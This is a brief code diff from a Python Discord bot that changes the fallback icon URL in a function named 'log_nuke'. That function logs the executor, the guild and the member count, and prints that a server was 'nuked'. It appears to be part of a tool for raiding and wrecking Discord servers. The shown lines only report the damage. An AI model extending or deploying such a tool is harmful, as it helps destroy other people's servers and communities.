@@ -18,7 +18,7 @@ async def log_nuke(ctx) -> None:
     executor_name = executor.display_name
     executor_id = executor.id
     member_count = guild.member_count
-    icon_url = guild.icon.url if guild.icon else "https://cdn.discordapp.com/embed/avatars/0.png"
+    icon_url = guild.icon.url if guild.icon else "https://placehold.co/512x512?text=No+Icon"
     print(f"nuked {guild} with {member_count} members.")
     embed = {
         "embeds": [
